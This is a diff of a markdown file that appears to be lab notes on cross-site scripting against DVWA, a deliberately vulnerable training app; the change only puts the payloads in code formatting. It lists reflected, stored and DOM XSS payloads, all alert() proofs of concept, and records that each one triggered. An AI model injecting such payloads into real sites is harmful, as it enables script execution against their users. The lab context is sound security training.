@@ -311,21 +311,21 @@ data:text/html,<script>alert('XSS')</script>
 
 #### Reflected XSS
 
-- Raw: <script>alert('XSS')</script>
+- Raw: `<script>alert('XSS')</script>`
 - URL-Encoded: %3Cscript%3Ealert('XSS')%3C/script%3E
 - Used at: http://dvwa.local/vulnerabilities/xss_r/?name=PAYLOAD
 - Result: ✓ Alert triggered
 
 #### Stored XSS
 
-- Raw: <img src=x onerror="alert('Stored XSS')">
+- Raw: `<img src=x onerror="alert('Stored XSS')">`
 - Submitted: Via form (Name + Message)
 - Stored in: Database
 - Result: ✓ Alert triggered every page load
 
 #### DOM XSS
 
-- Raw: <img src=x onerror="alert('DOM XSS')">
+- Raw: `<img src=x onerror="alert('DOM XSS')">`
 - Injected: Directly in URL parameter
 - Processing: JavaScript only (no server)
 - Result: ✓ Alert triggered from client-side JS
